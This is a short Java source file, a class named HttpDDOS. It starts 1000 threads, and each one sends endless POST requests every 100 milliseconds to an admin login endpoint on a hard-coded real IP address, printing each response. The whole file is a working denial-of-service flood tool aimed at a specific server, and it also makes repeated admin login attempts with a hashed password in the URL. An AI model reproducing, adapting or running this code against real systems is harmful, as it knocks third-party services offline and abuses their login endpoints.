package com.sun.http;

import java.util.concurrent.atomic.AtomicInteger;

public class HttpDDOS implements Runnable {

    private static AtomicInteger atomicInteger = new AtomicInteger();

    @Override
    public void run() {
        while (true) {
            String URL = "http://122.112.174.92:8015/eai_maple/ex/user/login.do?userid=admin&pwd=ba67e6279dd5e0e3f468afe28e5dc992&dynamic_code=&client_token=&host=&_responseCrypted=false";
            String s = HttpUtil.doPost(URL);
            System.out.println(s);
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}

class Main1 {
    public static void main(String[] args) {
        for (int i = 0; i < 1000; i++) {
            HttpDDOS main = new HttpDDOS();
            Thread thread = new Thread(main);
            thread.start();
        }
    }
}
